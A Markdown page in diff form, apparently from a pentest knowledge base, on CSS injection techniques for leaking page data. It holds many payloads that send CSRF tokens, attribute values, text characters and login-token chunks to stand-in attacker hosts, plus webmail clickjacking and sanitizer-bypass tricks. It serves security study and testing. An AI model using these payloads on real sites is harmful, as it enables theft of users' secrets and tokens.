@@ -1,0 +1,916 @@
+# CSS Injection
+
+{{#include ../../../banners/hacktricks-training.md}}
+
+## CSS Injection
+
+### LESS Code Injection
+
+LESS expands ordinary CSS with variables, mixins, functions, and the `@import` directive. If attacker input is compiled as LESS, those features can generate selectors or force resource requests that provide CSS-injection and XS-Leak primitives. In particular, `@import (inline)` makes the compiler fetch a referenced resource and embed its contents in the resulting CSS.
+
+{{#ref}}
+less-code-injection.md
+{{/ref}}
+
+### Attribute Selector
+
+CSS selectors are crafted to match values of an `input` element's `name` and `value` attributes. If the input element's value attribute starts with a specific character, a predefined external resource is loaded:<sup>[[1]](#references)[[3]](#references)[[4]](#references)</sup>
+
+```css
+input[name="csrf"][value^="a"] {
+  background-image: url(https://attacker.com/exfil/a);
+}
+input[name="csrf"][value^="b"] {
+  background-image: url(https://attacker.com/exfil/b);
+}
+/* ... */
+input[name="csrf"][value^="9"] {
+  background-image: url(https://attacker.com/exfil/9);
+}
+```
+
+However, this approach faces a limitation when dealing with hidden input elements (`type="hidden"`) because hidden elements do not load backgrounds.
+
+#### Bypass for Hidden Elements
+
+To circumvent this limitation, you can target a subsequent sibling element using the `~` general sibling combinator. The CSS rule then applies to all siblings following the hidden input element, causing the background image to load:<sup>[[2]](#references)</sup>
+
+```css
+input[name="csrf"][value^="csrF"] ~ * {
+  background-image: url(https://attacker.com/exfil/csrF);
+}
+```
+
+A practical example of exploiting this technique is detailed in the provided code snippet. You can view it [here](https://gist.github.com/d0nutptr/928301bde1d2aa761d1632628ee8f24e).<sup>[[2]](#references)[[22]](#references)</sup>
+
+#### Prerequisites for CSS Injection
+
+For the CSS Injection technique to be effective, certain conditions must be met:
+
+1. **Payload Length**: The CSS injection vector must support sufficiently long payloads to accommodate the crafted selectors.
+2. **CSS Re-evaluation**: You should have the ability to frame the page, which is necessary to trigger the re-evaluation of CSS with newly generated payloads.
+3. **External Resources**: The technique assumes the ability to use externally hosted images. This might be restricted by the site's Content Security Policy (CSP).
+
+### Blind Attribute Selector
+
+As [**explained in this post**](https://portswigger.net/research/blind-css-exfiltration), it's possible to combine the selectors **`:has`** and **`:not`** to identify content even from blind elements. This is very useful when you have no idea what is inside the web page loading the CSS injection.<sup>[[11]](#references)</sup>\
+It's also possible to use those selectors to extract information from several block of the same type like in:
+
+```html
+<style>
+  html:has(input[name^="m"]):not(input[name="mytoken"]) {
+    background: url(/m);
+  }
+</style>
+<input name="mytoken" value="1337" />
+<input name="myname" value="gareth" />
+```
+
+Combining this with the following **@import** technique, it's possible to exfiltrate a lot of **info using CSS injection from blind pages with** [**blind-css-exfiltration**](https://github.com/hackvertor/blind-css-exfiltration)**.**
+
+### @import
+
+The previous technique has some drawbacks, check the prerequisites. You either need to be able to **send multiple links to the victim**, or you need to be able to **iframe the CSS injection vulnerable page**.
+
+However, there is another clever technique that uses **CSS `@import`** to improve the quality of the technique.
+
+This was first showed by [**Pepe Vila**](https://vwzq.net/slides/2019-s3_css_injection_attacks.pdf) and it works like this:<sup>[[12]](#references)</sup>
+
+Instead of loading the same page once and again with tens of different payloads each time (like in the previous one), we are going to **load the page just once and just with an import to the attackers server** (this is the payload to send to the victim):
+
+```css
+@import url("//attacker.com:5001/start?");
+```
+
+1. The import is going to **receive some CSS script** from the attackers and the **browser will load it**.
+2. The first part of the CSS script the attacker will send is **another `@import` to the attackers server again.**
+   1. The attackers server won't respond this request yet, as we want to leak some chars and then respond this import with the payload to leak the next ones.
+3. The second and bigger part of the payload is going to be an **attribute selector leakage payload**
+   1. This will send to the attackers server the **first char of the secret and the last one**
+4. Once the attackers server has received the **first and last char of the secret**, it will **respond the import requested in the step 2**.
+   1. The response is going to be exactly the same as the **steps 2, 3 and 4**, but this time it will try to **find the second char of the secret and then penultimate**.
+
+The attacker will f**ollow that loop until it manages to leak completely the secret**.
+
+You can find the original [**Pepe Vila's code to exploit this here**](https://gist.github.com/cgvwzq/6260f0f0a47c009c87b4d46ce3808231) or you can find almost the [**same code but commented here**.](#css-injection)<sup>[[13]](#references)</sup>
+
+> [!TIP]
+> The script will try to discover 2 chars each time (from the beginning and from the end) because the attribute selector allows to do things like:
+>
+> ```css
+> /* value^= matches the beginning of the value */
+> input[value^="0"] {
+>  --s0: url(http://localhost:5001/leak?pre=0);
+> }
+>
+> /* value$=  to match the ending of the value*/
+> input[value$="f"] {
+>  --e0: url(http://localhost:5001/leak?post=f);
+> }
+> ```
+>
+> This allows the script to leak the secret faster.
+
+> [!WARNING]
+> Sometimes the script **doesn't detect correctly that the prefix + suffix discovered is already the complete flag** and it will continue forwards (in the prefix) and backwards (in the suffix) and at some point it will hang.\
+> No worries, just check the **output** because **you can see the flag there**.
+
+### Inline-Style CSS Exfiltration (attr() + if() + image-set())
+
+This primitive enables exfiltration using only an element's inline style attribute, without selectors or external stylesheets. It relies on CSS custom properties, the attr() function to read same-element attributes, the new CSS if() conditionals for branching, and image-set() to trigger a network request that encodes the matched value.<sup>[[5]](#references)[[7]](#references)</sup>
+
+> [!WARNING]
+> Equality comparisons in if() require double quotes for string literals. Single quotes will not match.
+
+- Sink: control an element's style attribute and ensure the target attribute is on the same element (attr() reads only same-element attributes).
+- Read: copy the attribute into a CSS variable: `--val: attr(title)`.<sup>[[9]](#references)</sup>
+- Decide: select a URL using nested conditionals comparing the variable with string candidates: `--steal: if(style(--val:"1"): url(//attacker/1); else: url(//attacker/2))`.<sup>[[8]](#references)</sup>
+- Exfiltrate: apply `background: image-set(var(--steal))` (or any fetching property) to force a request to the chosen endpoint.<sup>[[10]](#references)</sup>
+
+Attempt (does not work; single quotes in comparison):
+
+```html
+<div style="--val:attr(title);--steal:if(style(--val:'1'): url(/1); else: url(/2));background:image-set(var(--steal))" title=1>test</div>
+```
+
+Working payload (double quotes required in the comparison):
+
+```html
+<div style='--val:attr(title);--steal:if(style(--val:"1"): url(/1); else: url(/2));background:image-set(var(--steal))' title=1>test</div>
+```
+
+Enumerating attribute values with nested conditionals:
+
+```html
+<div style='--val: attr(data-uid); --steal: if(style(--val:"1"): url(/1); else: if(style(--val:"2"): url(/2); else: if(style(--val:"3"): url(/3); else: if(style(--val:"4"): url(/4); else: if(style(--val:"5"): url(/5); else: if(style(--val:"6"): url(/6); else: if(style(--val:"7"): url(/7); else: if(style(--val:"8"): url(/8); else: if(style(--val:"9"): url(/9); else: url(/10)))))))))); background: image-set(var(--steal));' data-uid='1'></div>
+```
+
+Realistic demo (probing usernames):
+
+```html
+<div style='--val: attr(data-username); --steal: if(style(--val:"martin"): url(https://attacker.tld/martin); else: if(style(--val:"zak"): url(https://attacker.tld/zak); else: url(https://attacker.tld/james))); background: image-set(var(--steal));' data-username="james"></div>
+```
+
+Notes and limitations:
+
+- Works on Chromium-based browsers at the time of research; behavior may differ on other engines.
+- Best suited for finite/enumerable value spaces (IDs, flags, short usernames). Stealing arbitrary long strings without external stylesheets remains challenging.
+- Any CSS property that fetches a URL can be used to trigger the request (e.g., background/image-set, border-image, list-style, cursor, content).
+
+Automation: a Burp Custom Action can generate nested inline-style payloads to brute-force attribute values: https://github.com/PortSwigger/bambdas/blob/main/CustomAction/InlineStyleAttributeStealer.bambda<sup>[[6]](#references)</sup>
+
+### Other selectors
+
+Other ways to access DOM parts with **CSS selectors**:
+
+- **`.class-to-search:nth-child(2)`**: This will search the second item with class "class-to-search" in the DOM.
+- **`:empty`** selector: Used for example in [**this writeup**](https://github.com/b14d35/CTF-Writeups/tree/master/bi0sCTF%202022/Emo-Locker)**:**<sup>[[21]](#references)</sup>
+
+  ```css
+  [role^="img"][aria-label="1"]:empty {
+    background-image: url("YOUR_SERVER_URL?1");
+  }
+  ```
+
+### Error based XS-Search
+
+**Reference:** [CSS based Attack: Abusing unicode-range of @font-face ](https://mksben.l0.cm/2015/10/css-based-attack-abusing-unicode-range.html), [Error-Based XS-Search PoC by @terjanq](https://twitter.com/terjanq/status/1180477124861407234)<sup>[[14]](#references)[[15]](#references)</sup>
+
+The overall intention is to **use a custom font from a controlled endpoint** and ensure that **text (in this case, 'A') is displayed with this font only if the specified resource (`favicon.ico`) cannot be loaded**.<sup>[[14]](#references)[[15]](#references)</sup>
+
+```html
+<!DOCTYPE html>
+<html>
+  <head>
+    <style>
+      @font-face {
+        font-family: poc;
+        src: url(http://attacker.com/?leak);
+        unicode-range: U+0041;
+      }
+
+      #poc0 {
+        font-family: "poc";
+      }
+    </style>
+  </head>
+  <body>
+    <object id="poc0" data="http://192.168.0.1/favicon.ico">A</object>
+  </body>
+</html>
+```
+
+1. **Custom Font Usage**:
+
+   - A custom font is defined using the `@font-face` rule within a `<style>` tag in the `<head>` section.
+   - The font is named `poc` and is fetched from an external endpoint (`http://attacker.com/?leak`).
+   - The `unicode-range` property is set to `U+0041`, targeting the specific Unicode character 'A'.
+
+2. **Object Element with Fallback Text**:
+   - An `<object>` element with `id="poc0"` is created in the `<body>` section. This element tries to load a resource from `http://192.168.0.1/favicon.ico`.
+   - The `font-family` for this element is set to `'poc'`, as defined in the `<style>` section.
+   - If the resource (`favicon.ico`) fails to load, the fallback content (the letter 'A') inside the `<object>` tag is displayed.
+   - The fallback content ('A') will be rendered using the custom font `poc` if the external resource cannot be loaded.
+
+### Styling Scroll-to-Text Fragment
+
+The **`:target`** pseudo-class is employed to select an element targeted by a **URL fragment**, as specified in the [CSS Selectors Level 4 specification](https://drafts.csswg.org/selectors-4/#the-target-pseudo). It's crucial to understand that `::target-text` doesn't match any elements unless the text is explicitly targeted by the fragment.
+
+A security concern arises when attackers exploit the **Scroll-to-text** fragment feature, allowing them to confirm the presence of specific text on a webpage by loading a resource from their server through HTML injection.<sup>[[16]](#references)</sup> The method involves injecting a CSS rule like this:
+
+```css
+:target::before {
+  content: url(target.png);
+}
+```
+
+In such scenarios, if the text "Administrator" is present on the page, the resource `target.png` gets requested from the server, indicating the text's presence. An instance of this attack can be executed through a specially crafted URL that embeds the injected CSS alongside a Scroll-to-text fragment:
+
+```
+http://127.0.0.1:8081/poc1.php?note=%3Cstyle%3E:target::before%20{%20content%20:%20url(http://attackers-domain/?confirmed_existence_of_Administrator_username)%20}%3C/style%3E#:~:text=Administrator
+```
+
+Here, the attack manipulates HTML injection to transmit the CSS code, aiming at the specific text "Administrator" through the Scroll-to-text fragment (`#:~:text=Administrator`). If the text is found, the indicated resource is loaded, inadvertently signaling its presence to the attacker.
+
+For mitigation, the following points should be noted:
+
+1. **Constrained STTF Matching**: Scroll-to-text Fragment (STTF) is designed to match only words or sentences, thereby limiting its capability to leak arbitrary secrets or tokens.
+2. **Restriction to Top-level Browsing Contexts**: STTF operates solely in top-level browsing contexts and does not function within iframes, making any exploitation attempt more noticeable to the user.
+3. **Necessity of User Activation**: STTF requires a user-activation gesture to operate, meaning exploitations are feasible only through user-initiated navigations. This requirement considerably mitigates the risk of attacks being automated without user interaction. Nevertheless, the blog post's author points out specific conditions and bypasses (e.g., social engineering, interaction with prevalent browser extensions) that might ease the attack's automation.
+
+Awareness of these mechanisms and potential vulnerabilities is key for maintaining web security and safeguarding against such exploitative tactics.
+
+For more information check the original report: [https://www.secforce.com/blog/new-technique-of-stealing-data-using-css-and-scroll-to-text-fragment-feature/](https://www.secforce.com/blog/new-technique-of-stealing-data-using-css-and-scroll-to-text-fragment-feature/)<sup>[[16]](#references)</sup>
+
+You can check an [**exploit using this technique for a CTF here**](https://gist.github.com/haqpl/52455c8ddfec33aeefb468301d70b6eb).
+
+### @font-face / unicode-range <a href="#text-node-exfiltration-i-ligatures" id="text-node-exfiltration-i-ligatures"></a>
+
+You can specify **external fonts for specific unicode values** that will only be **gathered if those unicode values are present** in the page. For example:
+
+```html
+<style>
+  @font-face {
+    font-family: poc;
+    src: url(http://attacker.example.com/?A); /* fetched */
+    unicode-range: U+0041;
+  }
+  @font-face {
+    font-family: poc;
+    src: url(http://attacker.example.com/?B); /* fetched too */
+    unicode-range: U+0042;
+  }
+  @font-face {
+    font-family: poc;
+    src: url(http://attacker.example.com/?C); /* not fetched */
+    unicode-range: U+0043;
+  }
+  #sensitive-information {
+    font-family: poc;
+  }
+</style>
+
+<p id="sensitive-information">AB</p>
+htm
+```
+
+When you access this page, Chrome and Firefox fetch "?A" and "?B" because text node of sensitive-information contains "A" and "B" characters. But Chrome and Firefox do not fetch "?C" because it does not contain "C". This means that we have been able to read "A" and "B".
+
+### Text node exfiltration (I): ligatures <a href="#text-node-exfiltration-i-ligatures" id="text-node-exfiltration-i-ligatures"></a>
+
+**Reference:** [Wykradanie danych w świetnym stylu – czyli jak wykorzystać CSS-y do ataków na webaplikację](https://sekurak.pl/wykradanie-danych-w-swietnym-stylu-czyli-jak-wykorzystac-css-y-do-atakow-na-webaplikacje/)<sup>[[17]](#references)</sup>
+
+The technique described involves extracting text from a node by exploiting font ligatures and monitoring changes in width.<sup>[[17]](#references)</sup> The process involves several steps:
+
+1. **Creation of Custom Fonts**:
+
+   - SVG fonts are crafted with glyphs having a `horiz-adv-x` attribute, which sets a large width for a glyph representing a two-character sequence.
+   - Example SVG glyph: `<glyph unicode="XY" horiz-adv-x="8000" d="M1 0z"/>`, where "XY" denotes a two-character sequence.
+   - These fonts are then converted to woff format using fontforge.
+
+2. **Detection of Width Changes**:
+
+   - CSS is used to ensure that text does not wrap (`white-space: nowrap`) and to customize the scrollbar style.
+   - The appearance of a horizontal scrollbar, styled distinctly, acts as an indicator (oracle) that a specific ligature, and hence a specific character sequence, is present in the text.
+   - The CSS involved:
+     ```css
+     body {
+       white-space: nowrap;
+     }
+     body::-webkit-scrollbar {
+       background: blue;
+     }
+     body::-webkit-scrollbar:horizontal {
+       background: url(http://attacker.com/?leak);
+     }
+     ```
+
+3. **Exploit Process**:
+
+   - **Step 1**: Fonts are created for pairs of characters with substantial width.
+   - **Step 2**: A scrollbar-based trick is employed to detect when the large width glyph (ligature for a character pair) is rendered, indicating the presence of the character sequence.
+   - **Step 3**: Upon detecting a ligature, new glyphs representing three-character sequences are generated, incorporating the detected pair and adding a preceding or succeeding character.
+   - **Step 4**: Detection of the three-character ligature is carried out.
+   - **Step 5**: The process repeats, progressively revealing the entire text.
+
+4. **Optimization**:
+   - The current initialization method using `<meta refresh=...` is not optimal.
+   - A more efficient approach could involve the CSS `@import` trick, enhancing the exploit's performance.
+
+### Text node exfiltration (II): leaking the charset with a default font (not requiring external assets) <a href="#text-node-exfiltration-ii-leaking-the-charset-with-a-default-font" id="text-node-exfiltration-ii-leaking-the-charset-with-a-default-font"></a>
+
+**Reference:** [PoC using Comic Sans by @Cgvwzq & @Terjanq](https://demo.vwzq.net/css2.html)<sup>[[18]](#references)</sup>
+
+This trick was released in this [**Slackers thread**](https://www.reddit.com/r/Slackers/comments/dzrx2s/what_can_we_do_with_single_css_injection/). The charset used in a text node can be leaked **using the default fonts** installed in the browser: no external -or custom- fonts are needed.<sup>[[18]](#references)[[19]](#references)</sup>
+
+The concept revolves around utilizing an animation to incrementally expand a `div`'s width, allowing one character at a time to transition from the 'suffix' part of the text to the 'prefix' part. This process effectively splits the text into two sections:
+
+1. **Prefix**: The initial line.
+2. **Suffix**: The subsequent line(s).
+
+The transition stages of the characters would appear as follows:
+
+**C**\
+ADB
+
+**CA**\
+DB
+
+**CAD**\
+B
+
+**CADB**
+
+During this transition, the **unicode-range trick** is employed to identify each new character as it joins the prefix. This is achieved by switching the font to Comic Sans, which is notably taller than the default font, consequently triggering a vertical scrollbar. This scrollbar's appearance indirectly reveals the presence of a new character in the prefix.
+
+Although this method allows the detection of unique characters as they appear, it does not specify which character is repeated, only that a repetition has occurred.
+
+> [!TIP]
+> Basically, the **unicode-range is used to detect a char**, but as we don't want to load an external font, we need to find another way.\
+> When the **char** is **found**, it's **given** the pre-installed **Comic Sans font**, which **makes** the char **bigger** and **triggers a scroll bar** which will **leak the found char**.
+
+Check the code extracted from the PoC:
+
+```css
+/* comic sans is high (lol) and causes a vertical overflow */
+@font-face {
+  font-family: has_A;
+  src: local("Comic Sans MS");
+  unicode-range: U+41;
+  font-style: monospace;
+}
+@font-face {
+  font-family: has_B;
+  src: local("Comic Sans MS");
+  unicode-range: U+42;
+  font-style: monospace;
+}
+@font-face {
+  font-family: has_C;
+  src: local("Comic Sans MS");
+  unicode-range: U+43;
+  font-style: monospace;
+}
+@font-face {
+  font-family: has_D;
+  src: local("Comic Sans MS");
+  unicode-range: U+44;
+  font-style: monospace;
+}
+@font-face {
+  font-family: has_E;
+  src: local("Comic Sans MS");
+  unicode-range: U+45;
+  font-style: monospace;
+}
+@font-face {
+  font-family: has_F;
+  src: local("Comic Sans MS");
+  unicode-range: U+46;
+  font-style: monospace;
+}
+@font-face {
+  font-family: has_G;
+  src: local("Comic Sans MS");
+  unicode-range: U+47;
+  font-style: monospace;
+}
+@font-face {
+  font-family: has_H;
+  src: local("Comic Sans MS");
+  unicode-range: U+48;
+  font-style: monospace;
+}
+@font-face {
+  font-family: has_I;
+  src: local("Comic Sans MS");
+  unicode-range: U+49;
+  font-style: monospace;
+}
+@font-face {
+  font-family: has_J;
+  src: local("Comic Sans MS");
+  unicode-range: U+4a;
+  font-style: monospace;
+}
+@font-face {
+  font-family: has_K;
+  src: local("Comic Sans MS");
+  unicode-range: U+4b;
+  font-style: monospace;
+}
+@font-face {
+  font-family: has_L;
+  src: local("Comic Sans MS");
+  unicode-range: U+4c;
+  font-style: monospace;
+}
+@font-face {
+  font-family: has_M;
+  src: local("Comic Sans MS");
+  unicode-range: U+4d;
+  font-style: monospace;
+}
+@font-face {
+  font-family: has_N;
+  src: local("Comic Sans MS");
+  unicode-range: U+4e;
+  font-style: monospace;
+}
+@font-face {
+  font-family: has_O;
+  src: local("Comic Sans MS");
+  unicode-range: U+4f;
+  font-style: monospace;
+}
+@font-face {
+  font-family: has_P;
+  src: local("Comic Sans MS");
+  unicode-range: U+50;
+  font-style: monospace;
+}
+@font-face {
+  font-family: has_Q;
+  src: local("Comic Sans MS");
+  unicode-range: U+51;
+  font-style: monospace;
+}
+@font-face {
+  font-family: has_R;
+  src: local("Comic Sans MS");
+  unicode-range: U+52;
+  font-style: monospace;
+}
+@font-face {
+  font-family: has_S;
+  src: local("Comic Sans MS");
+  unicode-range: U+53;
+  font-style: monospace;
+}
+@font-face {
+  font-family: has_T;
+  src: local("Comic Sans MS");
+  unicode-range: U+54;
+  font-style: monospace;
+}
+@font-face {
+  font-family: has_U;
+  src: local("Comic Sans MS");
+  unicode-range: U+55;
+  font-style: monospace;
+}
+@font-face {
+  font-family: has_V;
+  src: local("Comic Sans MS");
+  unicode-range: U+56;
+  font-style: monospace;
+}
+@font-face {
+  font-family: has_W;
+  src: local("Comic Sans MS");
+  unicode-range: U+57;
+  font-style: monospace;
+}
+@font-face {
+  font-family: has_X;
+  src: local("Comic Sans MS");
+  unicode-range: U+58;
+  font-style: monospace;
+}
+@font-face {
+  font-family: has_Y;
+  src: local("Comic Sans MS");
+  unicode-range: U+59;
+  font-style: monospace;
+}
+@font-face {
+  font-family: has_Z;
+  src: local("Comic Sans MS");
+  unicode-range: U+5a;
+  font-style: monospace;
+}
+@font-face {
+  font-family: has_0;
+  src: local("Comic Sans MS");
+  unicode-range: U+30;
+  font-style: monospace;
+}
+@font-face {
+  font-family: has_1;
+  src: local("Comic Sans MS");
+  unicode-range: U+31;
+  font-style: monospace;
+}
+@font-face {
+  font-family: has_2;
+  src: local("Comic Sans MS");
+  unicode-range: U+32;
+  font-style: monospace;
+}
+@font-face {
+  font-family: has_3;
+  src: local("Comic Sans MS");
+  unicode-range: U+33;
+  font-style: monospace;
+}
+@font-face {
+  font-family: has_4;
+  src: local("Comic Sans MS");
+  unicode-range: U+34;
+  font-style: monospace;
+}
+@font-face {
+  font-family: has_5;
+  src: local("Comic Sans MS");
+  unicode-range: U+35;
+  font-style: monospace;
+}
+@font-face {
+  font-family: has_6;
+  src: local("Comic Sans MS");
+  unicode-range: U+36;
+  font-style: monospace;
+}
+@font-face {
+  font-family: has_7;
+  src: local("Comic Sans MS");
+  unicode-range: U+37;
+  font-style: monospace;
+}
+@font-face {
+  font-family: has_8;
+  src: local("Comic Sans MS");
+  unicode-range: U+38;
+  font-style: monospace;
+}
+@font-face {
+  font-family: has_9;
+  src: local("Comic Sans MS");
+  unicode-range: U+39;
+  font-style: monospace;
+}
+@font-face {
+  font-family: rest;
+  src: local("Courier New");
+  font-style: monospace;
+  unicode-range: U+0-10FFFF;
+}
+
+div.leak {
+  overflow-y: auto; /* leak channel */
+  overflow-x: hidden; /* remove false positives */
+  height: 40px; /* comic sans capitals exceed this height */
+  font-size: 0px; /* make suffix invisible */
+  letter-spacing: 0px; /* separation */
+  word-break: break-all; /* small width split words in lines */
+  font-family: rest; /* default */
+  background: grey; /* default */
+  width: 0px; /* initial value */
+  animation: loop step-end 200s 0s, trychar step-end 2s 0s; /* animations: trychar duration must be 1/100th of loop duration */
+  animation-iteration-count: 1, infinite; /* single width iteration, repeat trychar one per width increase (or infinite) */
+}
+
+div.leak::first-line {
+  font-size: 30px; /* prefix is visible in first line */
+  text-transform: uppercase; /* only capital letters leak */
+}
+
+/* iterate over all chars */
+@keyframes trychar {
+  0% {
+    font-family: rest;
+  } /* delay for width change */
+  5% {
+    font-family: has_A, rest;
+    --leak: url(?a);
+  }
+  6% {
+    font-family: rest;
+  }
+  10% {
+    font-family: has_B, rest;
+    --leak: url(?b);
+  }
+  11% {
+    font-family: rest;
+  }
+  15% {
+    font-family: has_C, rest;
+    --leak: url(?c);
+  }
+  16% {
+    font-family: rest;
+  }
+  20% {
+    font-family: has_D, rest;
+    --leak: url(?d);
+  }
+  21% {
+    font-family: rest;
+  }
+  25% {
+    font-family: has_E, rest;
+    --leak: url(?e);
+  }
+  26% {
+    font-family: rest;
+  }
+  30% {
+    font-family: has_F, rest;
+    --leak: url(?f);
+  }
+  31% {
+    font-family: rest;
+  }
+  35% {
+    font-family: has_G, rest;
+    --leak: url(?g);
+  }
+  36% {
+    font-family: rest;
+  }
+  40% {
+    font-family: has_H, rest;
+    --leak: url(?h);
+  }
+  41% {
+    font-family: rest;
+  }
+  45% {
+    font-family: has_I, rest;
+    --leak: url(?i);
+  }
+  46% {
+    font-family: rest;
+  }
+  50% {
+    font-family: has_J, rest;
+    --leak: url(?j);
+  }
+  51% {
+    font-family: rest;
+  }
+  55% {
+    font-family: has_K, rest;
+    --leak: url(?k);
+  }
+  56% {
+    font-family: rest;
+  }
+  60% {
+    font-family: has_L, rest;
+    --leak: url(?l);
+  }
+  61% {
+    font-family: rest;
+  }
+  65% {
+    font-family: has_M, rest;
+    --leak: url(?m);
+  }
+  66% {
+    font-family: rest;
+  }
+  70% {
+    font-family: has_N, rest;
+    --leak: url(?n);
+  }
+  71% {
+    font-family: rest;
+  }
+  75% {
+    font-family: has_O, rest;
+    --leak: url(?o);
+  }
+  76% {
+    font-family: rest;
+  }
+  80% {
+    font-family: has_P, rest;
+    --leak: url(?p);
+  }
+  81% {
+    font-family: rest;
+  }
+  85% {
+    font-family: has_Q, rest;
+    --leak: url(?q);
+  }
+  86% {
+    font-family: rest;
+  }
+  90% {
+    font-family: has_R, rest;
+    --leak: url(?r);
+  }
+  91% {
+    font-family: rest;
+  }
+  95% {
+    font-family: has_S, rest;
+    --leak: url(?s);
+  }
+  96% {
+    font-family: rest;
+  }
+}
+
+/* increase width char by char, i.e. add new char to prefix */
+@keyframes loop {
+  0% {
+    width: 0px;
+  }
+  1% {
+    width: 20px;
+  }
+  2% {
+    width: 40px;
+  }
+  3% {
+    width: 60px;
+  }
+  4% {
+    width: 80px;
+  }
+  4% {
+    width: 100px;
+  }
+  5% {
+    width: 120px;
+  }
+  6% {
+    width: 140px;
+  }
+  7% {
+    width: 0px;
+  }
+}
+
+div::-webkit-scrollbar {
+  background: blue;
+}
+
+/* side-channel */
+div::-webkit-scrollbar:vertical {
+  background: blue var(--leak);
+}
+```
+
+### Text node exfiltration (III): leaking the charset with a default font by hiding elements (not requiring external assets) <a href="#text-node-exfiltration-ii-leaking-the-charset-with-a-default-font" id="text-node-exfiltration-ii-leaking-the-charset-with-a-default-font"></a>
+
+**Reference:** The writeup discusses this element-hiding idea as an unsuccessful attempted solution.<sup>[[20]](#references)</sup>
+
+This case is very similar to the previous one, however, in this case the goal of making specific **chars bigger than other is to hide something** like a button to not be pressed by the bot or a image that won't be loaded. So we could measure the action (or lack of the action) and know if a specific char is present inside the text.<sup>[[20]](#references)</sup>
+
+### Text node exfiltration (III): leaking the charset by cache timing (not requiring external assets) <a href="#text-node-exfiltration-ii-leaking-the-charset-with-a-default-font" id="text-node-exfiltration-ii-leaking-the-charset-with-a-default-font"></a>
+
+**Reference:** The same writeup evaluates this same-origin cache-timing variant as an unsuccessful attempt.<sup>[[20]](#references)</sup>
+
+In this case, we could try to leak if a char is in the text by loading a fake font from the same origin:<sup>[[20]](#references)</sup>
+
+```css
+@font-face {
+  font-family: "A1";
+  src: url(/static/bootstrap.min.css?q=1);
+  unicode-range: U+0041;
+}
+```
+
+If there is a match, the **font will be loaded from `/static/bootstrap.min.css?q=1`**. Although it won’t load successfully, the **browser should cache it**, and even if there is no cache, there is a **304 not modified** mechanism, so the **response should be faster** than other things.
+
+However, if the time difference of the cached response from the non-cached one isn't big enough, this won't be useful. For example, the author mentioned: However, after testing, I found that the first problem is that the speed is not much different, and the second problem is that the bot uses the `disk-cache-size=1` flag, which is really thoughtful.
+
+### Text node exfiltration (III): leaking the charset by timing loading hundreds of local "fonts" (not requiring external assets) <a href="#text-node-exfiltration-ii-leaking-the-charset-with-a-default-font" id="text-node-exfiltration-ii-leaking-the-charset-with-a-default-font"></a>
+
+**Reference:** Its final unsuccessful attempted variant amplifies timing differences by declaring hundreds of local font sources.<sup>[[20]](#references)</sup>
+
+In this case you can indicate **CSS to load hundreds of fake fonts** from the same origin when a match occurs. This way you can **measure the time** it takes and find out if a char appears or not with something like:<sup>[[20]](#references)</sup>
+
+```css
+@font-face {
+  font-family: "A1";
+  src: url(/static/bootstrap.min.css?q=1), url(/static/bootstrap.min.css?q=2),
+    .... url(/static/bootstrap.min.css?q=500);
+  unicode-range: U+0041;
+}
+```
+
+And the bot’s code looks like this:
+
+```python
+browser.get(url)
+WebDriverWait(browser, 30).until(lambda r: r.execute_script('return document.readyState') == 'complete')
+time.sleep(30)
+```
+
+So, if the font does not match, the response time when visiting the bot is expected to be approximately 30 seconds. However, if there is a font match, multiple requests will be sent to retrieve the font, causing the network to have continuous activity. As a result, it will take longer to satisfy the stop condition and receive the response. Therefore, the response time can be used as an indicator to determine if there is a font match.
+
+
+### Webmail CSS injection: trust-boundary abuse
+
+When attacker-controlled HTML/CSS is rendered inside a trusted webmail UI, look beyond classic secret exfiltration and test whether the sanitizer preserved interactive elements. A retained `<label for="...">` can activate any labelable control whose `id` lives outside the untrusted subtree, so clicking inside the email can open ribbons, focus inputs, toggle checkboxes, or trigger existing application actions. A quick recon query for candidate targets is `document.querySelectorAll('input[id],button[id],select[id],textarea[id]')`.<sup>[[23]](#references)</sup>
+
+A minimal label-based UI activation payload looks like this:<sup>[[23]](#references)</sup>
+
+```html
+<label for="RibbonModeToggle">Open UI</label>
+<label for="548">Pin this message</label>
+```
+
+If you get arbitrary CSS, pseudo-elements can also become a **CSS-only clickjacking** primitive. A fullscreen `:before` / `:after` attached to a trusted action inherits that element's click handler, so clicking anywhere on the page activates the underlying control. Chaining several overlays with increasing `z-index` can force multi-step workflows. See also [Clickjacking](../../clickjacking.md).<sup>[[23]](#references)</sup>
+
+```css
+.target:before {
+  position: fixed;
+  width: 100%;
+  height: 100%;
+  content: " ";
+  z-index: 10000000;
+}
+```
+
+### Sanitizer differentials, image-proxy bypasses, and CSSOM mutation
+
+In email/webmail targets, do not model CSS as passive styling. Useful request-capable sinks include `url()`, `image-set()`, `-webkit-image-set()`, `@import`, and even legacy `sourceMappingURL` comments. Sanitizers often miss parser differentials such as adjacent functions (`calc(...)url(...)`), comments inside unquoted `url(...)`, escapes between slashes (`url(/\0a/evil)` / `url(/\D/evil)`), or unresolved custom-property fallbacks. In practice these bugs can bypass image proxies or CSP allowlists and turn "remote images blocked" back into direct attacker-observable requests. See also [CSP bypass](../../content-security-policy-csp-bypass/README.md).<sup>[[23]](#references)</sup>
+
+```css
+background:image-set(var(--x,'//attacker.tld/open'));
+content:url(/\5c/user.fm/uid.fastmail.com/track);
+```
+
+If the target sanitizes **CSSOM output** instead of the original source, diff the raw stylesheet against serialized fields such as keyframe names and `mediaText`. Escaped bytes that looked harmless before validation can decode into `}`, `*`, `:`, or full declarations during serialization, escaping selector prefixing and reaching trusted UI. Also audit post-sanitization JavaScript that consumes allowed `data-*` attributes: if trusted code appends new elements or styles with forbidden declarations such as `position:fixed`, you have a **CSS gadget** that can be combined with allowed properties plus `!important` to break out of the message pane.<sup>[[23]](#references)</sup>
+
+### Clipboard races and compact token exfiltration
+
+If the target pastes HTML into a `contenteditable` editor, test whether inline CSS becomes active **before** sanitization completes. A quick probe is to copy `<style>*{color:red}</style>` as HTML and paste it into the composer; a brief flash confirms a race. Once CSS wins the race, nested attribute selectors can recover structured secrets from existing draft content with much less payload than a full brute force: anchor 5 hex characters at the start (`en=<hex5>`) and 5 at the end (`<hex5>&o`), then test arbitrary 5-character chunks anywhere else in the URL and reconstruct the two middle characters server-side from 4-character overlaps. This is practical against 12-character hex login tokens embedded inside longer attributes.<sup>[[23]](#references)</sup>
+
+```css
+a[href^="https://target/?token="] {
+  &[href*="en=c2e16"] { background:url(//attacker/s/c2e16); }
+  &[href*="a1781&o"] { background:url(//attacker/e/a1781); }
+  &[href*="2e167"] { background:url(//attacker/m/2e167); }
+}
+```
+
+### CSS-only keylogging, CSP-resistant text leaks, and AI rendering disparity
+
